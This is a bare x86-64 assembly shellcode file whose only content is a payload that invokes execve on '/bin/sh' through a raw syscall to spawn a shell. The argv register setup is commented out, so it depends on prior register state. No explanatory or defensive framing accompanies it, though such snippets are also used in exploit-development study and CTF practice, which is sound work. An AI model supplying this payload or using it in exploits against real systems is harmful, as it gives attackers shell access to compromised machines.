bits 64

global _start
section .text

_start:
    push    0x3b
    pop     rax                 ; execve()
    mov     rbx, "/bin/sh"
    push    rbx
    push    rsp
    pop     rdi                 ; arg0 (char* filename)
    ; xor     rsi, rsi            ; arg1 (argv)
    xor     rdx, rdx            ; arg2 (envp)
    syscall